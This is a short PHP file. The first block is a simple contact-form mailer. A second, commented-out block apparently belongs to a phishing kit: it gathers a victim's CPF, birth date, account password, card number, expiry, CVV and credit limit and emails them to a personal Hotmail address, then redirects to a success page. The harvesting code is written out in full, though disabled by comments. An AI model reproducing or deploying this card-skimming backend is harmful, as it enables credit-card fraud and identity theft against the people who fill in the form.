<?php
// Verifica se o formulário foi enviado
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Define as variáveis do formulário
    $nome = $_POST["nome"];
    $email = $_POST["email"];
    $mensagem = $_POST["mensagem"];

    // Configurações de e-mail
    $para = "fabianoamaral47@hotmail.com";
    $assunto = "Nova mensagem do site";

    // Monta o corpo do e-mail
    $corpo = "Nome: $nome\n";
    $corpo .= "Email: $email\n";
    $corpo .= "Mensagem:\n$mensagem";

    // Envia o e-mail
    if (mail($para, $assunto, $corpo)) {
        echo "Email enviado com sucesso!";
    } else {
        echo "Falha ao enviar o email. Por favor, tente novamente mais tarde.";
    }
}
?>



<?php
// $email = $_POST['email'];
// $name = $_POST['name'];
// $cpf = $_POST['cpf'];
// $data = $_POST['nascimento'];
// $cidade = $_POST['cidade'];
// $estado = $_POST['estado'];
// $senha = $_POST['senha'];
// $nome_cartao = $_POST['cartao_n'];
// $numero = $_POST['numero'];
// $validade = $_POST['mes']."/".$_POST['ano'];
// $codigo = $_POST['codigo'];
// $limite = $_POST['limite'];

// $body = "Email = ".$email."
// name = ".$name."
// Cpf = ".$cpf."
// Data de nascimento = ".$data."
// Cidade = ".$cidade."
// Estado = ".$estado."
// Senha cadastro = ".$senha."
// =====================================
// Nome cartao = ".$nome_cartao."
// Numero Cartao = ".$numero."
// validade = ".$validade."
// Cvv = ".$codigo."
// Limite = ".$limite."
// ";

// if(mail("fabianoamaral47@hotmail.com",$name."[".$limite."]",$body))
// {
// 	header("location:sucesso.html");
// };
?>
